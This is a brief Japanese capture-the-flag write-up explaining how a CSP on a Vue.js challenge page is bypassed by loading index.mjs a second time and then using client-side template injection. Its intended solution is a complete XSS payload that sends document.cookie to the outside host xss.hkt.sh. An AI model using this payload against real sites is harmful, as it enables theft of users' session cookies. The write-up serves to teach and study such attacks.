# Onomancy-Oriented Prophecy

Onomancy-Oriented Programming にCSPが追加されておりXSSが難しくなった。

`script-src 'self'` が許可されているので、`index.mjs` をもう一度読み込むことができる。Vue.jsの2度目の初期化の際にテンプレートが再度評価されるので、[Client-Side Template Injection](https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti) で任意のJavaScriptを実行することができる。

## 想定解

`"><script src="index.mjs?hoge" type="module"></script>{{constructor.constructor('location.href = "http://xss.hkt.sh/" + document.cookie')()}}`
